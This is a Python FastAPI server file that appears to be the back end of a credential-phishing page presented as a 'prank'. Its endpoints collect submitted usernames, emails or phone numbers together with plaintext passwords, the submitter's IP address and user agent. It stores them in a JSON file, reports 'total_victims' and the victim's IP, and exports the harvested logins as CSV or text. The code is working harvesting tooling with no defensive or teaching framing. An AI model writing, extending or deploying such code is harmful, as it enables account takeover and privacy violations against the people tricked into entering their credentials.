from fastapi import FastAPI, APIRouter, Request, HTTPException
from fastapi.responses import StreamingResponse, PlainTextResponse
from dotenv import load_dotenv
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
import os
import logging
from pathlib import Path
from pydantic import BaseModel, Field
from typing import List
import uuid
from datetime import datetime
import json
import csv
from io import StringIO

ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / '.env')

# Configure logging first
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# MongoDB connection (kept, though file-based storage is used for credentials)
mongo_url = os.environ['MONGO_URL']
client = AsyncIOMotorClient(mongo_url)
db = client[os.environ['DB_NAME']]

# Create the main app without a prefix
app = FastAPI()

# Create a router with the /api prefix
api_router = APIRouter(prefix="/api")


# Define Models
class StatusCheck(BaseModel):
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    client_name: str
    timestamp: datetime = Field(default_factory=datetime.utcnow)

class StatusCheckCreate(BaseModel):
    client_name: str

class PrankCredentials(BaseModel):
    email: str  # This will be email, username, or phone number
    password: str
    userAgent: str
    url: str
    prankedAt: str
    timestamp: int


CREDENTIALS_FILE = ROOT_DIR / "pranked_user.json"
REQUIRED_FIELDS = [
    "id",
    "emailOrUsername",
    "password",
    "ipAddress",
    "userAgent",
    "url",
    "prankedAt",
    "timestamp",
]


def _read_credentials() -> List[dict]:
    if not CREDENTIALS_FILE.exists():
        return []
    try:
        content = CREDENTIALS_FILE.read_text().strip()
        if not content:
            return []
        data = json.loads(content)
        if isinstance(data, list):
            return data
        return []
    except (json.JSONDecodeError, ValueError):
        return []


def _write_credentials(data: List[dict]):
    CREDENTIALS_FILE.write_text(json.dumps(data, indent=2))


# Add your routes to the router instead of directly to app
@api_router.get("/")
async def root():
    return {"message": "Hello World"}


@api_router.post("/status", response_model=StatusCheck)
async def create_status_check(input: StatusCheckCreate):
    status_dict = input.dict()
    status_obj = StatusCheck(**status_dict)
    _ = await db.status_checks.insert_one(status_obj.dict())
    return status_obj


@api_router.get("/status", response_model=List[StatusCheck])
async def get_status_checks():
    status_checks = await db.status_checks.find().to_list(1000)
    return [StatusCheck(**status_check) for status_check in status_checks]


@api_router.post("/save-prank-credentials")
async def save_prank_credentials(credentials: PrankCredentials, request: Request):
    try:
        # Load existing data or create empty list
        existing_data = _read_credentials()

        # Get client IP address
        client_ip = request.client.host
        forwarded_for = request.headers.get("X-Forwarded-For")
        if forwarded_for:
            client_ip = forwarded_for.split(",")[0].strip()

        # Add new credentials to the list
        new_entry = {
            "id": str(uuid.uuid4()),
            "emailOrUsername": credentials.email,  # Can be email, username, or phone
            "password": credentials.password,
            "ipAddress": client_ip,
            "userAgent": credentials.userAgent,
            "url": credentials.url,
            "prankedAt": credentials.prankedAt,
            "timestamp": credentials.timestamp,
        }

        existing_data.append(new_entry)

        # Save back to file
        _write_credentials(existing_data)

        logger.info(f"🎭 Saved pranked credentials for: {credentials.email}")

        return {
            "success": True,
            "message": "Credentials saved successfully",
            "total_victims": len(existing_data),
            "victim_identifier": credentials.email,
            "victim_ip": client_ip,
        }

    except Exception as e:
        logger.error(f"Error saving prank credentials: {str(e)}")
        raise HTTPException(status_code=500, detail=f"Failed to save credentials: {str(e)}")


@api_router.get("/pranked-credentials")
async def list_pranked_credentials():
    """
    Returns the saved credentials from pranked_user.json as a list.
    If the file does not exist or is invalid/empty, returns an empty list.
    """
    return _read_credentials()


@api_router.delete("/pranked-credentials/{entry_id}")
async def delete_pranked_credential(entry_id: str):
    """Delete a single credential entry by id."""
    data = _read_credentials()
    before = len(data)
    data = [d for d in data if str(d.get("id")) != entry_id]
    if len(data) == before:
        raise HTTPException(status_code=404, detail="Entry not found")
    _write_credentials(data)
    return {"deleted": True, "remaining": len(data)}


@api_router.post("/pranked-credentials/clear")
async def clear_pranked_credentials():
    """Clear all credential entries."""
    _write_credentials([])
    return {"cleared": True}


@api_router.get("/pranked-credentials/export")
async def export_pranked_credentials(format: str = "csv"):
    """
    Export credentials as CSV or TXT.
    - CSV: header + rows with all fields
    - TXT: one entry per line in a readable format
    """
    data = _read_credentials()

    if format.lower() == "csv":
        output = StringIO()
        writer = csv.DictWriter(output, fieldnames=REQUIRED_FIELDS)
        writer.writeheader()
        for row in data:
            writer.writerow({k: row.get(k, "") for k in REQUIRED_FIELDS})
        content = output.getvalue()
        headers = {
            "Content-Disposition": f"attachment; filename=pranked_credentials_{int(datetime.utcnow().timestamp())}.csv"
        }
        return StreamingResponse(iter([content]), media_type="text/csv", headers=headers)

    # TXT export
    lines = []
    for r in data:
        line = (
            f"id={r.get('id','')} | user={r.get('emailOrUsername','')} | pass={r.get('password','')} | "
            f"ip={r.get('ipAddress','')} | ua={r.get('userAgent','')} | url={r.get('url','')} | at={r.get('prankedAt','')} | ts={r.get('timestamp','')}"
        )
        lines.append(line)
    content = "\n".join(lines)
    headers = {
        "Content-Disposition": f"attachment; filename=pranked_credentials_{int(datetime.utcnow().timestamp())}.txt"
    }
    return PlainTextResponse(content, media_type="text/plain", headers=headers)


# Include the router in the main app
app.include_router(api_router)

# CORS configuration with optional allow-all toggle for development
_allow_all = os.environ.get('ALLOW_ALL_ORIGINS', '').strip().lower() in {"1", "true", "yes", "on"}
if _allow_all:
    logger.info("CORS: Allow all origins enabled (credentials disabled)")
    app.add_middleware(
        CORSMiddleware,
        allow_credentials=False,
        allow_origins=["*"],
        allow_methods=["*"],
        allow_headers=["*"],
    )
else:
    _origins = os.environ.get('CORS_ORIGINS', '*').split(',')
    logger.info(f"CORS: Restricted origins: {_origins}")
    app.add_middleware(
        CORSMiddleware,
        allow_credentials=True,
        allow_origins=_origins,
        allow_methods=["*"],
        allow_headers=["*"],
    )

@app.on_event("shutdown")
async def shutdown_db_client():
    client.close()